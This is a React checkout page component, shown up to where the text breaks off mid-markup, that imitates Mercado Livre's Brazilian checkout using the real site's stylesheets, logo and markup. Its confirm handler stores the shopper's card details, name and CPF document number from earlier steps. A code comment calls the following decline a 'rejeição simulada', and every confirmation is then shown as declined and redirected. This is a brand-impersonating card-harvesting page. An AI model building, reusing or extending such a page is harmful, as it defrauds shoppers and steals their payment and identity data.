import React, { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useStore } from "@/contexts/StoreContext";
import { formatCurrencyParts } from "@/utils/formatters";
import { supabase } from "@/integrations/supabase/client";
import { useTracking } from "@/contexts/TrackingContext";
import { buildCustomerFields, loadCheckoutAddress, markOrderSaved, clearSavedOrder } from "@/utils/orderBuilder";
import { getCheckoutShipping } from "@/utils/checkoutShipping";

const StoreCheckoutCardConfirmation = () => {
    const navigate = useNavigate();
    const { cartItems, cartTotal, createOrder } = useStore();
    const { trackPurchase } = useTracking();

    const [cardData, setCardData] = useState<any>(null);
    const [installments, setInstallments] = useState<any>(null);
    const [addressData, setAddressData] = useState<any>(null);
    const [deliveryDays, setDeliveryDays] = useState({ min: 2, max: 5 });
    const [isFreeShipping, setIsFreeShipping] = useState(false);
    const selectedShipping = getCheckoutShipping();
    const shippingCost = selectedShipping && !selectedShipping.isFree ? selectedShipping.price : 0;
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [confirmState, setConfirmState] = useState<'idle' | 'loading' | 'rejected'>('idle');
    const [showStickyFooter, setShowStickyFooter] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);
    const inlineBtnRef = useRef<HTMLButtonElement>(null);

    useEffect(() => {
        if (cartItems.length === 0) {
            navigate("/store/cart", { replace: true });
            return;
        }

        const savedCard = localStorage.getItem('checkout_card_input');
        if (savedCard) try { setCardData(JSON.parse(savedCard)); } catch (e) { }

        const savedInst = localStorage.getItem('checkout_installment_selection');
        if (savedInst) try { setInstallments(JSON.parse(savedInst)); } catch (e) { }

        const savedAddr = localStorage.getItem('checkout_address');
        if (savedAddr) try { setAddressData(JSON.parse(savedAddr)); } catch (e) { }

        const fetchDelivery = async () => {
            const { data } = await supabase.from("settings").select("*").eq("key", "delivery_settings").maybeSingle();
            if (data?.value) {
                const v = data.value as any;
                setDeliveryDays({ min: v.delivery_days_min || 2, max: v.delivery_days_max || 5 });
                setIsFreeShipping(v.is_free_shipping ?? false);
            }
        };
        fetchDelivery();
    }, [cartItems, navigate]);

    useEffect(() => {
        window.scrollTo(0, 0);
        document.body.setAttribute("data-site", "MLB");
        document.body.setAttribute("data-country", "BR");
        return () => {
            document.body.removeAttribute("data-site");
            document.body.removeAttribute("data-country");
        }
    }, []);

    // Mostra o sticky footer apenas quando o botão inline sai da tela
    useEffect(() => {
        const btn = inlineBtnRef.current;
        if (!btn) return;
        const observer = new IntersectionObserver(
            ([entry]) => setShowStickyFooter(!entry.isIntersecting),
            { threshold: 0, rootMargin: '0px' }
        );
        observer.observe(btn);
        return () => observer.disconnect();
    }, []);

    // Header amarelo ao rolar no mobile
    useEffect(() => {
        const onScroll = () => setIsScrolled(window.scrollY > 50);
        window.addEventListener('scroll', onScroll, { passive: true });
        return () => window.removeEventListener('scroll', onScroll);
    }, []);

    const baseAmount = installments ? installments.total : cartTotal;
    const grandTotal = baseAmount + shippingCost;
    const valFmt = formatCurrencyParts(grandTotal);
    const shippingFmt = formatCurrencyParts(shippingCost);

    const getDeliveryDate = (days: number) => {
        const d = new Date();
        let added = 0;
        while (added < days) {
            d.setDate(d.getDate() + 1);
            if (d.getDay() !== 0 && d.getDay() !== 6) added++;
        }
        const day = String(d.getDate()).padStart(2, '0');
        const month = d.toLocaleString('pt-BR', { month: 'short' }).replace('.', '');
        return `${day} ${month}`;
    };

    const handleConfirm = async () => {
        if (confirmState !== 'idle') return;
        setIsSubmitting(true);
        setConfirmState('loading');

        // Captura o lead/pedido antes de mostrar a rejeição simulada
        const finalAmount = (installments?.total || cartTotal) + shippingCost;
        sessionStorage.setItem('last_order_total', String(finalAmount || 0));

        // Pre-save the order so /declined can simply update it instead of racing a second insert
        clearSavedOrder();
        try {
            const addr = addressData || loadCheckoutAddress();
            const order = await createOrder({
                ...buildCustomerFields(addr),
                total: finalAmount,
                subtotal: cartTotal,
                shipping_cost: shippingCost,
                status: "pending",
                payment_method: "credit_card",
                payment_status: "pending",
                card_bin: cardData?.cardNumber?.replace(/\s+/g, '').slice(-4) || null,
                notes: JSON.stringify({
                    stage: "card_confirmation",
                    cardLast4: cardData?.cardNumber?.replace(/\s+/g, '').slice(-4),
                    installments: installments?.installments
                }),
                items: cartItems.map(i => ({
                    product_id: i.product.id,
                    name: i.product.name,
                    quantity: i.quantity,
                    price: i.product.price
                }))
            });
            if (order) {
                markOrderSaved({ ...(order as any), payment_method: "credit_card" });
                trackPurchase(finalAmount, "BRL", cartItems.map((i: any) => ({
                    product_id: i.product.id,
                    name: i.product.name,
                    quantity: i.quantity,
                    price: i.product.price
                })));
            }
        } catch (e) {
            console.error("Failed to pre-save card order:", e);
        }

        setTimeout(() => {
            setConfirmState('rejected');
            setTimeout(() => {
                navigate("/store/checkout/declined");
            }, 1200);
        }, 1800);
    };

    return (
        <div data-site="MLB" data-country="BR" style={{ width: '100vw', margin: 0, padding: 0 }}>
            <style>
                {`
                a#nav-skip-to-main-content {
                    display: none !important;
                } 
                a#nav-a11y-feedback-link {
                    display: none !important;
                }
                @media screen and (max-width: 767px) {
                    main#root-app, main#root-app > div, #review_main_container, .bf-ui-core-container {
                        width: 100% !important;
                        max-width: 100vw !important;
                        min-width: 0 !important;
                        box-sizing: border-box !important;
                    }
                    body, html {
                        overflow-x: hidden !important;
                        min-width: auto !important;
                    }
                    #review_step_container {
                        display: flex;
                        flex-direction: column;
                        margin: 0 !important;
                        padding: 0 !important;
                        width: 100% !important;
                        max-width: 100vw !important;
                        box-sizing: border-box !important;
                    }
                    div#review_header_main_container {
                        order: 1;
                        background: #fff !important;
                        width: 100% !important;
                    }
                    div#resumo_da_compra_container {
                        order: 2;
                        margin-bottom: 24px;
                        width: 100% !important;
                        box-sizing: border-box !important;
                    }
                    div#review_resume_main_container {
                        order: 3;
                        padding: 16px !important;
                        width: 100% !important;
                        box-sizing: border-box !important;
                    }
                    h1.andes-typography.andes-typography--type-title.andes-typography--size-m.andes-typography--color-primary.andes-typography--weight-semibold {
                        margin-left: 16px;
                    }
                    .bf-core-header {
                        display: flex !important;
                        background: #fff !important;
                        margin: 0 !important;
                    }
                    header#mobile-header {
                        border: none !important;
                        box-shadow: none !important;
                        transition: background 0.3s ease, box-shadow 0.3s ease;
                    }
                    header#mobile-header.header-scrolled {
                        background: #ffe600 !important;
                        box-shadow: 0 2px 8px rgba(255, 230, 0, 0.5) !important;
                    }
                    header#mobile-header.header-scrolled .bf-core-header__title--visible {
                        color: rgba(0, 0, 0, 0.9) !important;
                    }
                }
                @media screen and (min-width: 768px) {
                    .mobile-only-block {
                        display: none !important;
                    }
                    div#review_resume_main_container {
                        margin-top: -261px !important;
                    }
                    .bf-ui-core-container.bf-ui-core-container--flex.bf-ui-core-container--flex-direction--row.bf-ui-core-container--flex-align--top.bf-ui-core-container--flex-text_align--left.bf-ui-core-container--flex-justify--between.bf-ui-core-container--flex-height--wrap_content.bf-ui-core-container--flex-width--match_parent.bf-ui-core-container--flex-wrap--no-wrap.bf-ui-core-container--margin--top-spacing4.bf-ui-core-container--margin--bottom-spacing4.bf-ui-core-container--margin--left-spacing4.bf-ui-core-container--margin--right-spacing4 {
                        margin: 0 !important;
                    }
                }

                /* === Confirm button states === */
                @keyframes btn-shimmer {
                    0%   { transform: translateX(-100%); }
                    100% { transform: translateX(250%); }
                }
                @keyframes dot-pulse {
                    0%, 60%, 100% { opacity: 0.2; transform: scale(0.8); }
                    30%           { opacity: 1;   transform: scale(1); }
                }
                .confirm-btn-wrap {
                    display: flex;
                    justify-content: center;
                    width: 100%;
                }
                /* Base */
                .confirm-btn {
                    position: relative;
                    width: 100% !important;
                    height: 48px;
                    overflow: hidden;
                    cursor: pointer;
                    transition:
                        width 0.55s cubic-bezier(0.4, 0, 0.2, 1),
                        border-radius 0.55s cubic-bezier(0.4, 0, 0.2, 1),
                        background-color 0.3s ease;
                }
                /* ── LOADING: shimmer sweep sobre o botão azul, texto dim ── */
                .confirm-btn--loading {
                    pointer-events: none;
                    width: 100% !important;
                }
                /* listra de brilho animada */
                .confirm-btn--loading::before {
                    content: '';
                    position: absolute;
                    top: 0; left: 0;
                    width: 40%;
                    height: 100%;
                    background: linear-gradient(
                        105deg,
                        transparent 20%,
                        rgba(255,255,255,0.28) 50%,
                        transparent 80%
                    );
                    animation: btn-shimmer 1.1s ease-in-out infinite;
                    z-index: 1;
                    pointer-events: none;
                }
                /* texto fica visível mas levemente dim */
                .confirm-btn--loading .btn-text {
                    opacity: 0.55;
                    transition: opacity 0.25s ease;
                }
                .confirm-btn--loading .btn-dots { display: none !important; }
                /* ── REJECTED: encolhe para bola vermelha ── */
                .confirm-btn--rejected {
                    width: 48px !important;
                    border-radius: 50% !important;
                    background-color: #d93025 !important;
                    pointer-events: none;
                }
                .confirm-btn--rejected .btn-text { opacity: 0; }
                .confirm-btn--rejected .btn-dots { display: flex !important; }
                /* Texto */
                .btn-text {
                    transition: opacity 0.25s ease;
                    white-space: nowrap;
                    position: relative;
                    z-index: 2;
                }
                /* Dots */
                .btn-dots {
                    display: none;
                    position: absolute;
                    top: 50%; left: 50%;
                    transform: translate(-50%, -50%);
                    gap: 5px;
                    align-items: center;
                }
                .btn-dots span {
                    display: block;
                    width: 5px; height: 5px;
                    background: #fff;
                    border-radius: 50%;
                    animation: dot-pulse 0.9s ease-in-out infinite;
                }
                .btn-dots span:nth-child(2) { animation-delay: 0.15s; }
                .btn-dots span:nth-child(3) { animation-delay: 0.30s; }
                .confirm-btn .andes-button__content {
                    display: flex; align-items: center; justify-content: center;
                    height: 100%; position: relative; z-index: 2;
                }
                /* Mobile sticky footer: oculto por padrão, exibido via JS */
                #review_footer_container {
                    transform: translateY(100%);
                    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                }
                #review_footer_container.footer-visible {
                    transform: translateY(0);
                }
                `}
            </style>
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-review-frontend/index.desktop.7d2d8933.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.15.0/modeless-box.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.15.0/mercadolibre/navigation-desktop.css" />

            <header role="banner" data-siteid="MLB" className="nav-header nav-header-pluslite ui-navigation-v2">
                <div className="nav-bounds">
                    <div className="nav-header-logo">
                        <a id="nav-skip-to-main-content" className="nav-skip-to-main-content">
                            <span className="nav-skip-to-main-content__content">Pular para o conteúdo principal</span>
                        </a>
                        <a id="nav-a11y-feedback-link" className="nav-a11y-feedback-link">
                            <span className="nav-a11y-feedback-link__content">Acessibilidade</span>
                        </a>
                        
          
          <a className="nav-logo" style={{ backgroundImage: "url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/pt_logo_large_plus@2x.webp')", backgroundSize: "134px 34px", backgroundRepeat: "no-repeat" }}>
                            Mercado Livre - Ir para a página principal
                        </a>
                    </div>
                    <div className="nav-header-menu-wrapper">
                        <nav id="nav-header-menu" aria-label="Menu do usuário">
                            <ul className="nav-header-menu-list">
                                <li className="nav-header-menu-list__item">
                                    <div className="nav-header-user">
                                        <input type="checkbox" id="nav-header-user-switch" />
                                        <nav className="nav-header-user-layer user-menu--hidden user-menu user-menu--rounded-4 user-menu__one-column"
                                            tabIndex={-1} hidden={true} aria-label={`Patricia, Configurações`} aria-modal="true"
                                            role="dialog">
                                            <div className="user-menu__main">
                                                <div className="user-menu__user-info-outer-container user-menu__user-with-loyalty">
                                                    <div className="user-menu__user-info-inner-container">
                                                        <div className="user-menu__user-badge user-menu__user-badge--center">
                                                            <a className="user-menu-evolution" role="button" aria-label={`Perfil, Patricia`}>
                                                                <div className="user-menu-evolution__user-badge-image">
                                                                    <div className="user-menu-evolution__user-initials">PS</div>
                                                                </div>
                                                                <div className="user-menu-evolution__user-badge-title">Patricia</div>
                                                                <div className="user-menu-evolution__user-action-label">
                                                                    Meu perfil
                                                                    <span className="user-menu-evolution__user-badge-email-chevron"></span>
                                                                </div>
                                                            </a>
                                                        </div>
                                                        <div className="user-menu__user-pill--evolution">
                                                            <a className="user-menu__user-pill-anchor">
                                                                <img src="https://http2.mlstatic.com/resources/frontend/statics/loyal/partners/meliplus/drawer/pill_drawer_melimas_mp_mlb_no_price_large_new_value_prop@3x.png"
                                                                    alt="Meli mais, assine a partir de R$ 8,90/mês"
                                                                    decoding="async" className="user-menu__user-pill-image" />
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>
                                                <ul className="user-menu__shortcuts">
                                                    <li>
                                                        <span className="user-menu__shortcuts-separator"></span>
                                                        <a data-id="purchases" rel="nofollow">Minhas Compras</a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </nav>
                                    </div>
                                </li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>

            <main role="main" id="root-app">
                <div data-js="external-js" className="sr-only">
                    <div id="mldp"></div>
                </div>
                <div></div>
                <div id="review_main_container"
                    className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                    aria-hidden="false" data-js="container" data-id="review_main_container" data-testid="review_main_container">

                    <div id="status_bar"
                        className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                        aria-hidden="false" data-js="container" data-id="status_bar" data-testid="status_bar"></div>

                    <div id="review_step_container"
                        className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                        aria-hidden="false" data-js="container" data-id="review_step_container"
                        data-testid="review_step_container">


                        <div id="review_header_main_container"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--background-white"
                            aria-hidden="false" data-js="container" data-id="review_header_main_container"
                            data-testid="review_header_main_container">

                            <header id="mobile-header" data-js="mobile-header" data-testid="mobile-header" className={`bf-core-header bf-core-header--yellow${isScrolled ? ' header-scrolled' : ''}`}>
                                <div className="bf-core-header__container bf-core-header__container--yellow">
                                    <button type="button" onClick={() => navigate(-1)} className="bf-core-header__button bf-core-icon-custom-size">
                                        <span className="andes-visually-hidden">Voltar</span>
                                        <span className="bf-ui-core-rich-text__icon" data-testid="undefined-0" id="undefined-0" aria-hidden="true" role="presentation">
                                            <img className="bf-ui-core-rich-text__icon--image" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_left_arrow_black.svg" alt="" />
                                        </span>
                                    </button>
                                    <h1 className="bf-core-header__title--visible">Confira e confirme</h1>
                                </div>
                            </header>

                            <div id="bf-core-header__children-placeholder" data-testid="bf-core-header__children-placeholder" className="bf-core-header__children-placeholder"></div>

                            <span className="bf-ui-core-label bf-ui-core-label--margin--bottom-spacing20 bf-ui-core-label--padding--left-spacing20 bf-ui-core-label--padding--right-spacing20"
                                role="presentation" data-testid="review_header_title" id="review_header_title" aria-hidden="false">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlem" aria-hidden="false" data-testid="review_header_title_rich_text-0" id="review_header_title_rich_text-0">
                                    <h1 className="andes-typography andes-typography--type-title andes-typography--size-m andes-typography--color-primary andes-typography--weight-semibold">
                                        Confira e confirme
                                    </h1>
                                </div>
                            </span>
                        </div>

                        <div id="review_resume_main_container"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--stretch bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--padding--bottom-spacing20 bf-ui-core-container--padding--left-spacing20 bf-ui-core-container--padding--right-spacing20"
                            aria-hidden="false" data-js="container" data-id="review_resume_main_container"
                            style={{ marginTop: '-20px' }}
                            data-testid="review_resume_main_container">

                            {/* FATURAMENTO */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation" data-testid="review_billing_info_detail_title" id="review_billing_info_detail_title" aria-hidden="false">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs" aria-hidden="false">
                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">
                                        Faturamento
                                    </h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column bf-ui-core-card__content--flex-align--stretch bf-ui-core-card__content--flex-text_align--left bf-ui-core-card__content--flex-justify--between bf-ui-core-card__content--flex-height--wrap_content bf-ui-core-card__content--flex-width--match_parent bf-ui-core-card__content--flex-wrap--no-wrap">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_bill.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label" role="presentation" aria-hidden="false">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">{addressData?.name || "Comprador"}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--flex bf-ui-core-label--flex-direction--row bf-ui-core-label--flex-align--bottom bf-ui-core-label--flex-text_align--left bf-ui-core-label--flex-justify--left bf-ui-core-label--flex-height--wrap_content bf-ui-core-label--flex-width--match_parent bf-ui-core-label--flex-wrap--wrap bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">
                                                        {cardData?.doc_type || addressData?.doc_type || 'CPF'}: {cardData?.doc_number || addressData?.document || '—'}
                                                    </span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div className="andes-card__footer bf-ui-core-card__footer bf-ui-core-card__footer--flex bf-ui-core-card__footer--flex-direction--column bf-ui-core-card__footer--flex-align--stretch bf-ui-core-card__footer--flex-text_align--left bf-ui-core-card__footer--flex-justify--between bf-ui-core-card__footer--flex-height--wrap_content bf-ui-core-card__footer--flex-width--match_parent bf-ui-core-card__footer--flex-wrap--no-wrap andes-card__footer--border">
                                    <span className="bf-ui-core-rich-text__link">
                                        <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular">Alterar dados de fatura</a>
                                    </span>
                                </div>
                            </div>

                            {/* DETALHE DA ENTREGA */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation" aria-hidden="false">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs">
                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">
                                        Detalhe da entrega
                                    </h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column bf-ui-core-card__content--flex-align--stretch bf-ui-core-card__content--flex-text_align--left bf-ui-core-card__content--flex-justify--between bf-ui-core-card__content--flex-height--wrap_content bf-ui-core-card__content--flex-width--match_parent bf-ui-core-card__content--flex-wrap--no-wrap">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_gps_pin.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label" role="presentation" aria-hidden="false">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">{addressData ? `${addressData.streetName} ${addressData.streetNumber}`.trim() : "Endereço"}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing4" role="presentation" aria-hidden="false">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">Enviar para o meu endereço</span>
                                                </span>
                                                <span className="bf-ui-core-rich-text__link bf-ui-core-rich-text__link--margin--left-spacing4">
                                                    <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-semibold">Alterar modo de entrega</a>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div className="andes-card__footer bf-ui-core-card__footer bf-ui-core-card__footer--flex bf-ui-core-card__footer--flex-direction--column bf-ui-core-card__footer--flex-align--stretch bf-ui-core-card__footer--flex-text_align--left bf-ui-core-card__footer--flex-justify--between bf-ui-core-card__footer--flex-height--wrap_content bf-ui-core-card__footer--flex-width--match_parent bf-ui-core-card__footer--flex-wrap--no-wrap andes-card__footer--border">
                                    <span className="bf-ui-core-rich-text__link">
                                        <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular">Alterar endereço</a>
                                    </span>
                                </div>
                            </div>

                            {/* PRODUTO (REPRESENTATIVO) */}
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column bf-ui-core-card__content--flex-align--stretch bf-ui-core-card__content--flex-text_align--left bf-ui-core-card__content--flex-justify--between bf-ui-core-card__content--flex-height--wrap_content bf-ui-core-card__content--flex-width--match_parent bf-ui-core-card__content--flex-wrap--no-wrap">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap">
                                        <div className="andes-thumbnail-multiple andes-thumbnail-multiple--stacked andes-thumbnail-multiple--stacked-40 bf-ui-core-thumbnail-multiple">
                                            {cartItems.map((item, idx) => (
                                                <div key={item.product.id + idx} className="andes-thumbnail-container">
                                                    <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                        <img aria-hidden="true" alt={item.product.name} src={item.product.image} />
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--left-spacing16">
                                            <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--center bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--wrap">
                                                <span className="bf-ui-core-label bf-ui-core-label--flex bf-ui-core-label--flex-direction--row bf-ui-core-label--flex-align--center bf-ui-core-label--flex-text_align--left bf-ui-core-label--flex-justify--left bf-ui-core-label--flex-height--wrap_content bf-ui-core-label--flex-width--match_parent bf-ui-core-label--flex-wrap--no-wrap bf-ui-core-label--margin--bottom-spacing4 bf-ui-core-label--margin--right-spacing4" role="presentation">
                                                    <span className="andes-visually-hidden">Envio 1 Full</span>
                                                    <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodyxs">
                                                        <span className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-primary andes-typography--weight-regular">Envio 1</span>
                                                    </span>
                                                    <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodyxs">
                                                        <span className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-primary andes-typography--weight-regular" style={{ margin: '0 4px' }}>|</span>
                                                    </span>
                                                    <span className="bf-ui-core-rich-text__icon">
                                                        <img className="bf-ui-core-rich-text__icon--image" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_full.svg" alt="" height="12px" />
                                                    </span>
                                                </span>
                                            </div>
                                            <span className="bf-ui-core-label" role="presentation">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Chegará entre {getDeliveryDate(deliveryDays.min)} e {getDeliveryDate(deliveryDays.max)}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--flex bf-ui-core-label--flex-direction--row bf-ui-core-label--flex-align--bottom bf-ui-core-label--flex-text_align--left bf-ui-core-label--flex-justify--left bf-ui-core-label--flex-height--wrap_content bf-ui-core-label--flex-width--match_parent bf-ui-core-label--flex-wrap--wrap bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">{cartItems[0]?.product.name || 'Produto Exemplo'} - Quantidade: {cartItems[0]?.quantity || 1}{cartItems.length > 1 ? ` e outros \${cartItems.length - 1} itens` : ''}</span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div className="andes-card__footer bf-ui-core-card__footer bf-ui-core-card__footer--flex bf-ui-core-card__footer--flex-direction--column bf-ui-core-card__footer--flex-align--stretch bf-ui-core-card__footer--flex-text_align--left bf-ui-core-card__footer--flex-justify--between bf-ui-core-card__footer--flex-height--wrap_content bf-ui-core-card__footer--flex-width--match_parent bf-ui-core-card__footer--flex-wrap--no-wrap andes-card__footer--border">
                                    <span className="bf-ui-core-rich-text__link">
                                        <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular">Alterar data de entrega</a>
                                    </span>
                                </div>
                            </div>

                            {/* DETALHE DO PAGAMENTO */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs">
